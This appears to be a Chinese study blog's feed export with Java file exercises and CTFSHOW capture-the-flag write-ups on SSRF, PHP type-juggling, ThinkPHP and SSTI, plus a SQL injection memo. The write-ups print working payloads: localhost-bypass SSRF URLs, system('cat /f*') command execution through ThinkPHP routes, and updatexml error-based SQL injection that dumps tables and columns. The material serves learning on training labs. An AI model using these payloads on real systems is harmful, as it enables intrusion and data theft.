class="string">&quot;chaospeo&quot;</span>;</span><br><span class="line">        chaospeo.hp = <span class="number">0.0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ewoji.attack(chaospeo);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (EnemyDeadException e)&#123;</span><br><span class="line">            System.out.println(e.getMessage());</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br></pre></td></tr></table></figure>

<p><img   src="/../img/$%7Bfiilename%7D/image-20240329103008655.png"  alt="image-20240329103008655"></p>
<h1 id="找出C盘中最大和最小的文件"><a href="#找出C盘中最大和最小的文件" class="headerlink" title="找出C盘中最大和最小的文件"></a>找出C盘中最大和最小的文件</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">		<span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span><span class="number">0</span> ,n = <span class="number">0</span>;</span><br><span class="line">		<span class="type">File</span> <span class="variable">f1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;c://&quot;</span>);</span><br><span class="line">		File f[] = <span class="keyword">new</span> <span class="title class_">File</span>[f1.listFiles().length];</span><br><span class="line">		f = f1.listFiles();</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; f.length; i++) &#123;</span><br><span class="line">		<span class="comment">//f.length()返回的是一个long型的数字</span></span><br><span class="line">			<span class="type">long</span> max,min;</span><br><span class="line">			max = f[<span class="number">0</span>].length();</span><br><span class="line">			min = f[<span class="number">0</span>].length();</span><br><span class="line">			<span class="keyword">if</span>(max&lt;f[i].length())&#123;</span><br><span class="line">				max = f[i].length();</span><br><span class="line">				m = i;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span>(min&gt;f[i].length())&#123;</span><br><span class="line">				min = f[i].length();</span><br><span class="line">				n=i;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		System.out.println(<span class="string">&quot;最大的文件是&quot;</span>+f[m].getName()+<span class="string">&quot;\n&quot;</span>+<span class="string">&quot;大小是&quot;</span>+f[m].length());</span><br><span class="line">		System.out.println(<span class="string">&quot;最小的文件是&quot;</span>+f[n].getName()+<span class="string">&quot;\n&quot;</span>+<span class="string">&quot;大小是&quot;</span>+f[n].length());</span><br><span class="line">&#125;		</span><br></pre></td></tr></table></figure>

<p>不知道是不是权限问题，扫出来好几个文件是0kb</p>
<h1 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">    <span class="type">File</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;e://ctf/双重url编码.py&quot;</span>);</span><br><span class="line">    <span class="keyword">try</span>(<span class="type">FileInputStream</span> <span class="variable">fio</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(f))&#123;</span><br><span class="line">       <span class="type">byte</span> text[] = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>)f.length()];</span><br><span class="line">       <span class="type">char</span> tex[] = <span class="keyword">new</span> <span class="title class_">char</span>[text.length];</span><br><span class="line">       <span class="comment">//填充的是数字字节</span></span><br><span class="line">       fio.read(text);</span><br><span class="line">       <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; text.length; i++) &#123;</span><br><span class="line">          tex[i] = (<span class="type">char</span>)text[i];</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="type">String</span> <span class="variable">my</span> <span class="operator">=</span> String.valueOf(tex);</span><br><span class="line">       System.out.println(my);</span><br><span class="line">    &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">       e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<h1 id="创建文件并且写入文件"><a href="#创建文件并且写入文件" class="headerlink" title="创建文件并且写入文件"></a>创建文件并且写入文件</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">		<span class="type">File</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;e://ctf/test.txt&quot;</span>);</span><br><span class="line">		<span class="comment">//创建</span></span><br><span class="line">		<span class="keyword">try</span>&#123;</span><br><span class="line">			f.createNewFile();</span><br><span class="line">		&#125;<span class="keyword">catch</span>(IOException e)&#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//写入</span></span><br><span class="line">		<span class="keyword">try</span>&#123;</span><br><span class="line">			<span class="type">FileOutputStream</span> <span class="variable">fio</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(f);</span><br><span class="line">			<span class="type">byte</span> ji[] = &#123;<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;4&#x27;</span>&#125;;</span><br><span class="line">			fio.write(ji);</span><br><span class="line">			fio.close();</span><br><span class="line">		&#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p><img   src="/../img/$%7Bfiilename%7D/image-20240329115117304.png"  alt="image-20240329115117304"></p>
<h1 id="拆分文件"><a href="#拆分文件" class="headerlink" title="拆分文件"></a>拆分文件</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//拆分</span></span><br><span class="line"><span class="type">File</span> <span class="variable">f1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;e://ctf/test1.txt&quot;</span>);</span><br><span class="line"><span class="type">File</span> <span class="variable">f2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;e://ctf/test2.txt&quot;</span>);</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    f1.createNewFile();</span><br><span class="line">    f2.createNewFile();</span><br><span class="line">&#125;<span class="keyword">catch</span>(IOException e)&#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="type">FileOutputStream</span> <span class="variable">fio1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(f1);</span><br><span class="line">    <span class="type">FileOutputStream</span> <span class="variable">fio2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(f2);</span><br><span class="line">    <span class="type">byte</span> kb1[] = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">50</span>];</span><br><span class="line">    <span class="type">byte</span> kb2[] = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">50</span>];</span><br><span class="line">    <span class="type">byte</span> kb3[] = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">100</span>];</span><br><span class="line">    <span class="type">FileInputStream</span> <span class="variable">fio3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(f);</span><br><span class="line">    fio3.read(kb3);</span><br><span class="line">    fio3.close();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; kb1.length; i++) &#123;</span><br><span class="line">       kb1[i] = kb3[i];</span><br><span class="line">       kb2[i] = kb3[i];</span><br><span class="line">    &#125;</span><br><span class="line">    fio1.write(kb1);</span><br><span class="line">    fio2.write(kb2);</span><br><span class="line">    fio1.close();</span><br><span class="line">    fio2.close();</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">catch</span>(IOException e)&#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="用流复制图片"><a href="#用流复制图片" class="headerlink" title="用流复制图片"></a>用流复制图片</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">		<span class="type">FileInputStream</span> <span class="variable">fr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;e://ctf/ljava/go.png&quot;</span>);</span><br><span class="line">		<span class="type">byte</span> kb[] = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">8192</span>];</span><br><span class="line">		fr.read(kb);</span><br><span class="line">		<span class="type">FileOutputStream</span> <span class="variable">fw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;e://ctf/ljava/go1.png&quot;</span>);</span><br><span class="line">		fw.write(kb);</span><br><span class="line">		fr.close();</span><br><span class="line">		fw.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//main</span></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入备忘录</title>
    <url>/2024/05/10/SQL%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/</url>
    <content><![CDATA[<h1 id="more-deeper"><a href="#more-deeper" class="headerlink" title="more deeper"></a>more deeper</h1><span id="more"></span>

<h1 id="元数据库-information-schema"><a href="#元数据库-information-schema" class="headerlink" title="元数据库:information_schema"></a>元数据库:information_schema</h1><h2 id="插一嘴"><a href="#插一嘴" class="headerlink" title="插一嘴"></a>插一嘴</h2><p>schema翻译为图解，图略。顾名思义这个库就是我们整个mysql数据库的图略，它包含了所有库，表，列的名称，但不包含具体信息。</p>
<h2 id="能做什么"><a href="#能做什么" class="headerlink" title="能做什么"></a>能做什么</h2><p>1.在开发者使用中，我们用的<code>show databases</code>,<code>show tables</code>,<code>show columns from xxx</code>等命令回显的数据就是直接从这个图略获取的</p>
<p>2.在渗透测试中，对我们探测数据十分有作用，可以说是起决定性作用</p>
<h2 id="怎么用"><a href="#怎么用" class="headerlink" title="怎么用"></a>怎么用</h2><p>这是我经常忘记的一个点了，因为它名字太瘠薄长了，现在重看就感觉还好</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">information_schema  图略库</span><br><span class="line">图略库下的常用表有:</span><br><span class="line">SCHEMATA 所有库名</span><br><span class="line">TABLES   所有表名</span><br><span class="line">COLUMNS  所有列名</span><br><span class="line"></span><br><span class="line">库名表中常用的列用:</span><br><span class="line">SCHEMA_NAME 库名</span><br><span class="line">DEFAULT_CHARACTER_SET_NAME 编码格式</span><br><span class="line"></span><br><span class="line">表名表中的常用的列有:</span><br><span class="line">TABLE_NAME     表名</span><br><span class="line">TABLE_SCHEMA   此表隶属的库</span><br><span class="line"></span><br><span class="line">列名表中常用的列有:</span><br><span class="line">COLUMN_NAME    列名</span><br><span class="line">TABLE_NAME   此列隶属的表</span><br><span class="line"></span><br><span class="line">查所有库名:select SCHEMA_NAME from information_schema.SCHEMATAT;</span><br><span class="line">查某库中所有表名:select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=&quot;xxx&quot;;</span><br><span class="line">查某表中所有的列名:select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&quot;xxx&quot;;</span><br></pre></td></tr></table></figure>

<h1 id="order-by是啥"><a href="#order-by是啥" class="headerlink" title="order by是啥"></a>order by是啥</h1><h2 id="正常使用"><a href="#正常使用" class="headerlink" title="正常使用"></a>正常使用</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240510165925638.png"  alt="image-20240510165925638"></p>
<p>这是一张正常查询的表</p>
<p><code>order by</code>顾名思义就是按照什么排序，这里默认应该是<code>order by id</code>所以是按1,2,3,4这样排下来</p>
<p>那如果我<code>order by username</code>呢</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240510170133893.png"  alt="image-20240510170133893"></p>
<p>可以看到是按中间的名字排的，所以按名字开头a,b,c,d排下来</p>
<h2 id="注入中使用"><a href="#注入中使用" class="headerlink" title="注入中使用"></a>注入中使用</h2><p>那么我们老<code>order by 1</code>,<code>order by 2</code>,<code>order by 3</code>干啥呢</p>
<p>其实这里的</p>
<p>order by 1&#x3D;order by id</p>
<p>order by 2&#x3D;order by username</p>
<p>order by 3 &#x3D;order by password</p>
<p>就好比我突然<code>order by nb</code>，nb这个列名不存在，自然会报错不回显，所以我突然<code>order by 4</code>自然也是报错</p>
<p>这样我们就知道了这个表到底有多少列，自然也就能正确使用union联合注入了</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240510170824696.png"  alt="image-20240510170824696"></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240510170811729.png"  alt="image-20240510170811729"></p>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>备忘</tag>
      </tags>
  </entry>
  <entry>
    <title>SSRF-CTFSHOW</title>
    <url>/2024/03/22/SSRF-CTFSHOW/</url>
    <content><![CDATA[<h1 id="CTFSHOW"><a href="#CTFSHOW" class="headerlink" title="CTFSHOW"></a>CTFSHOW</h1><span id="more"></span>

<p>ssrf本质是把web服务器当作跳板，请求一些不让直接请求的东西</p>
<h1 id="web351"><a href="#web351" class="headerlink" title="web351"></a>web351</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240322173840844.png"  alt="image-20240322173840844"></p>
<p><code>curl_init()</code>打开一个curl会话</p>
<p><code>curl_setopt()</code>设置输出流信息:</p>
<p>第一个是不把头文件信息当作输出流带回</p>
<p>第二个是把curl_exec请求到的信息统统发回</p>
<p>payload:<code>url=127.0.0.1/flag.php</code></p>
<h1 id="web352"><a href="#web352" class="headerlink" title="web352"></a>web352</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240322175247131.png"  alt="image-20240322175247131"></p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=http://0/flag.php</span><br><span class="line">url=http://0.0.0.0/flag.php</span><br><span class="line">url=http://0x7f.0.0.1/flag.php</span><br><span class="line">url=http://0177.0.0.1/flag.php</span><br><span class="line">缺省模式：127.0.0.1写成127.1</span><br><span class="line">CIDR：url=http://127.127.127.127/flag.php</span><br></pre></td></tr></table></figure>

<p>前两个都是用0.0.0.0(代表本机任何ip)来绕过的</p>
<p>后两个分别是用十六进制和八进制来绕过的</p>
<h1 id="web353"><a href="#web353" class="headerlink" title="web353"></a>web353</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240322181428742.png"  alt="image-20240322181428742"></p>
<p>同上题目</p>
<h1 id="web354"><a href="#web354" class="headerlink" title="web354"></a>web354</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240322193022404.png"  alt="image-20240322193022404"></p>
<p>ban掉了0和1，说明本地的127.0.0.1怎么都绕不过去了</p>
<p>换一种思路，输入一个解析到127.0.0.1的域名即可</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240322193226851.png"  alt="image-20240322193226851"></p>
<p>payload:<code>url=http://ecd.tencent.com/flag.php</code></p>
<h1 id="web355"><a href="#web355" class="headerlink" title="web355"></a>web355</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240322194654981.png"  alt="image-20240322194654981"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=http://0/flag.php</span><br><span class="line">url=http://127.1/flag.php</span><br></pre></td></tr></table></figure>

<h1 id="web356"><a href="#web356" class="headerlink" title="web356"></a>web356</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240322195149266.png"  alt="image-20240322195149266"></p>
<p><code>url=http://0/flag.php</code></p>
<h1 id="web357"><a href="#web357" class="headerlink" title="web357"></a>web357</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240328194834744.png"  alt="image-20240328194834744"></p>
<p>FILETER_FLAG_NO_PRIV_RANGE:要求值不在保留的ip范围内</p>
<p>FILETER_FLAG_NO_RES_RANGE:要求值不在 RFC 指定的私有范围 IP 内</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240328195426762.png"  alt="image-20240328195426762"></p>
<p>意思是以上的ip地址都不能用了，就不能用指向了，所以我们用302挑战即可</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240328195527042.png"  alt="image-20240328195527042"></p>
<h1 id="web358"><a href="#web358" class="headerlink" title="web358"></a>web358</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240328200847412.png"  alt="image-20240328200847412"></p>
<p>要求url以<code>http://ctf.</code>为开头，show为结尾</p>
<p>payload:<code>url=http://ctf.@127.0.0.1/flag.php?show</code></p>
<p>@表示以ctf.用户名访问，?表示get传参</p>
<h1 id="web359"><a href="#web359" class="headerlink" title="web359"></a>web359</h1>]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>入门</tag>
        <tag>CTFSHOW</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP特性ctfshow</title>
    <url>/2024/03/02/PHP%E7%89%B9%E6%80%A7ctfshow/</url>
    <content><![CDATA[<h1 id="CTFSHOW"><a href="#CTFSHOW" class="headerlink" title="CTFSHOW"></a>CTFSHOW</h1><span id="more"></span>

<h1 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302112347828.png"  alt="image-20240302112347828"></p>
<p><code>intval()</code>获取变量的整数值，如果是变量是数组的话，要看数组里面有没有元素，有元素返回1，没有元素返回0，这里传入一个有元素的数组即可</p>
<h1 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302113937890.png"  alt="image-20240302113937890"></p>
<p><code>intval()</code>的第二个参数是用来识别前一个参数是什么进制，如果为0，就是自动检测，0x开头的会被识别为16进制，0开头会被识别为8进制，否则，将使用10进制，这里第二个参数默认为10，就是按十进制识别</p>
<p>所以把4476转为16进制，在开头加入0x传入即可</p>
<h1 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302125706558.png"  alt="image-20240302125706558"></p>
<p>先看这里两个正则&#x2F;^php$&#x2F;im,&#x2F;^php$&#x2F;i</p>
<p>i:不区分大小写匹配</p>
<p>m:以每行为一个单位匹配</p>
<p>^:匹配单位的开头</p>
<p>$:匹配单位的末尾</p>
<p>这题要求我们既要满足第一个正则，又不满足第二个正则，而两个的区别在于m，多行匹配与否的问题</p>
<p>这里的^xxx$意思说要匹配的单位只能是xxx，不要什么都匹配不到</p>
<p>那么我们只要在第二行有php，第一行没有，就满足了</p>
<p><strong>payload:%0aphp</strong></p>
<p>%0a是url编码的换行符</p>
<h1 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302130355748.png"  alt="image-20240302130355748"></p>
<p>可以传入4476e1,弱比较时也不会把它转化为4476，因为e一般表示科学计数法，它转化为什么就不知道了,但是intval却可以转化为4476</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240302140721408.png"  alt="image-20240302140721408"></p>
<p>这里hint是错的，验证过了，其他字母会被弱等于转化然后输出nonono</p>
<h1 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302132556869.png"  alt="image-20240302132556869"></p>
<p>上面说了0开头会以八进制识别</p>
<h1 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302134509330.png"  alt="image-20240302134509330"></p>
<p>要想输出flag，有三个条件</p>
<p>1.num不能强等于4476</p>
<p>2.num中不能有字母</p>
<p>3.num的开头不能是0(<code>strpos()</code>会返回0第一次出现的位置，从0开始)</p>
<p>第一种方法:</p>
<p>绕过<code>strpos()</code>传入+010574,其中+不能在url中直接输入，会被解析为空格,要输入%2B010574</p>
<p>第二种方法:</p>
<p>绕过强等于，直接传入4476.0，强度于两边数据类型不同直接返回false</p>
<h1 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302135645125.png"  alt="image-20240302135645125"></p>
<p>弱等于，用以上第一种方法</p>
<h1 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302141223598.png"  alt="image-20240302141223598"></p>
<p>传入.&#x2F;flag.php即可</p>
<h1 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240302201703858.png"  alt="image-20240302201703858"></p>
<p>强度于，数组绕过</p>
<p><code>md5()</code>被传入一个数组时，会返回null，于是我们传入两个数组，结果就是null&#x3D;&#x3D;&#x3D;null,即可绕过</p>
<p>payload:a[]&#x3D;1&amp;b[]&#x3D;2</p>
<h1 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h1><p>到这先，先去学别的大类漏洞吧</p>
]]></content>
      <categories>
        <category>学习</category>
        <category>ctfshow</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>ctf</tag>
        <tag>入门</tag>
        <tag>php</tag>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>ThinkPHP-CTFSHOW</title>
    <url>/2024/04/13/ThinkPHP-ctfshow/</url>
    <content><![CDATA[<h1 id="挖洞必经之路"><a href="#挖洞必经之路" class="headerlink" title="挖洞必经之路"></a>挖洞必经之路</h1><span id="more"></span>

<p>学</p>
<p><a class="link"   href="https://static.kancloud.cn/manual/thinkphp/1678" >序言 · ThinkPHP3.2.3完全开发手册 · 看云 (kancloud.cn)<i class="fas fa-external-link-alt"></i></a></p>
<h1 id="web569"><a href="#web569" class="headerlink" title="web569"></a>web569</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240414110912329.png"  alt="image-20240414110912329"></p>
<p>如题所说，了解pathinfo即可拿到flag</p>
<p>payload:<code>index.php/admin/login/ctfshowlogin</code></p>
<h1 id="web570"><a href="#web570" class="headerlink" title="web570"></a>web570</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240414111946911.png"  alt="image-20240414111946911"></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240414112855650.png"  alt="image-20240414112855650"></p>
<p>在给出的附件的Commom&#x2F;Conf.php中找到了这个闭包路由，有个可以执行命令的函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call_user_func()函数第一个参数是要执行的命令，第二个参数是这个命令的参数</span><br></pre></td></tr></table></figure>

<p>比如我们想执行phpinfo()那么我们的payload就是<code>/ctfshow/phpinfo/1</code></p>
<p>由于在url中使用&#x2F;会被路由替换，所以要把命令逃出来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload1:/index.php/ctfshow/assert/assert($_GET[1])?1=system(&#x27;cat /f*&#x27;);</span><br><span class="line">payload2:/index.php/ctfshow/assert/eval($_GET[1])?1=system(&#x27;cat /f*&#x27;);</span><br></pre></td></tr></table></figure>

<p>不知道为什么用两个eval就打不通，估计现在我还理解不了</p>
<h1 id="web571"><a href="#web571" class="headerlink" title="web571"></a>web571</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240415180500901.png"  alt="image-20240415180500901"></p>
<p>打开源码发现有可控参数n</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240415225802599.png"  alt="image-20240415225802599"></p>
<p>持续跟进函数,最终追到这里</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240415225923394.png"  alt="image-20240415225923394"></p>
<p>实际上本地调试的时候不是到这里，看别的文章说是题目环境和我的环境不一样的问题</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload:/index.php/Home/index/index?n=&lt;?php system(cat /f*);?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wrong payload:/index.php/Home/index/index/n/&lt;?php system(cat /f*);?&gt;</span><br><span class="line">按理来说这是path_info的标准格式，但是我发现要是参数有&lt;后面的东西一概不出来，调试功力不足，也看不出</span><br></pre></td></tr></table></figure>

<h1 id="web372"><a href="#web372" class="headerlink" title="web372"></a>web372</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240417105806980.png"  alt="image-20240417105806980"></p>
<p>爆破+rce</p>
<p>首先thinkphp的debug模式是自动打开的，也就是说每个报错都会记录到日志中去，这样我们只要读取日志即可</p>
<p>应该是开发者目录结构设置不好，正常怎么会给进入&#x2F;Application呢</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">日志目录:/Application/Runtime/Logs/模块名/年份_月份_日期.log</span><br></pre></td></tr></table></figure>

<p><img   src="/../img/$%7Bfiilename%7D/image-20240417110114141.png"  alt="image-20240417110114141"></p>
<p>开扫</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240417153113112-1713339073489-1.png"  alt="image-20240417153113112"></p>
<p>会扫出来一个今天的和一个黑客21年留下的后门</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240417153146759.png"  alt="image-20240417153146759"></p>
<p>顺着这个后门rce即可</p>
<h1 id="web373"><a href="#web373" class="headerlink" title="web373"></a>web373</h1><p><a class="link"   href="https://blog.csdn.net/qq_50589021/article/details/120616736" >thinkPHP3.2.3sql注入漏洞_think\controller:parsesql方法不存在!-CSDN博客<i class="fas fa-external-link-alt"></i></a></p>
<p>由于我下的版本是3.2.5，本地没复现成功，就看别人的吧</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//爆表</span><br><span class="line">index.php?id[where]= 1%20and%20updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) %23</span><br><span class="line">//爆列名</span><br><span class="line">index.php?id[where]= 1%20and%20updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;flags&#x27;),0x7e),1) %23</span><br><span class="line">//爆字段值</span><br><span class="line">index.php?id[where]= 1%20and%20updatexml(1,concat(0x7e,substr((select group_concat(flag4s) from flags),16,32),0x7e),1) %23</span><br></pre></td></tr></table></figure>



<h1 id="到此为止先，想要完整做出一题要审的代码太多，功力不足，撤退"><a href="#到此为止先，想要完整做出一题要审的代码太多，功力不足，撤退" class="headerlink" title="到此为止先，想要完整做出一题要审的代码太多，功力不足，撤退"></a>到此为止先，想要完整做出一题要审的代码太多，功力不足，撤退</h1>]]></content>
      <categories>
        <category>漏洞复现</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>SSTI-CTFSHOW</title>
    <url>/2024/04/12/SSTI-CTFSHOW-1/</url>
    <content><![CDATA[<h1 id="CTFSHOW"><a href="#CTFSHOW" class="headerlink" title="CTFSHOW"></a>CTFSHOW</h1><span id="more"></span>

<p><a class="link"   href="https://boogipop.com/2023/03/02/CTFSHOW-SSTI/" >CTFSHOW-SSTI - Boogiepop Doesn’t Laugh (boogipop.com)<i class="fas fa-external-link-alt"></i></a></p>
<p>巨几把详细，使我逐渐理解一切</p>
<h1 id="web361"><a href="#web361" class="headerlink" title="web361"></a>web361</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240329185224740.png"  alt="image-20240329185224740"></p>
<p>需要在url传入name&#x3D;payload</p>
<p>但是我们并不知道subclasses()后，os._wrap_close类在哪</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240329185402511.png"  alt="image-20240329185402511"></p>
<p>小写了个脚本去找</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span>(flag):</span><br><span class="line">  text = <span class="built_in">input</span>(<span class="string">&quot;[+]需要查找的文本为:&quot;</span>)</span><br><span class="line">  pattern = <span class="string">r&quot;&#x27;(.*?)&#x27;&quot;</span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;[+]你可能要找的类有:os._wrap_close,file,site._Printer,subprocess.Popen,warnings.catch_warnings&quot;</span>)</span><br><span class="line">  find = <span class="built_in">input</span>(<span class="string">&quot;[+]需要匹配的类为:&quot;</span>)</span><br><span class="line">  result = re.findall(pattern,text)</span><br><span class="line">  <span class="keyword">for</span> i,val <span class="keyword">in</span> <span class="built_in">enumerate</span>(result):</span><br><span class="line">      <span class="keyword">if</span>(re.<span class="keyword">match</span>(find,val)):</span><br><span class="line">          <span class="built_in">print</span>(<span class="string">&quot;[-]下标为&quot;</span>,i)</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">  flag = <span class="built_in">input</span>(<span class="string">&quot;[+]继续扣1结束扣0:&quot;</span>)    </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img   src="/../img/$%7Bfiilename%7D/image-20240329185449121.png"  alt="image-20240329185449121"></p>
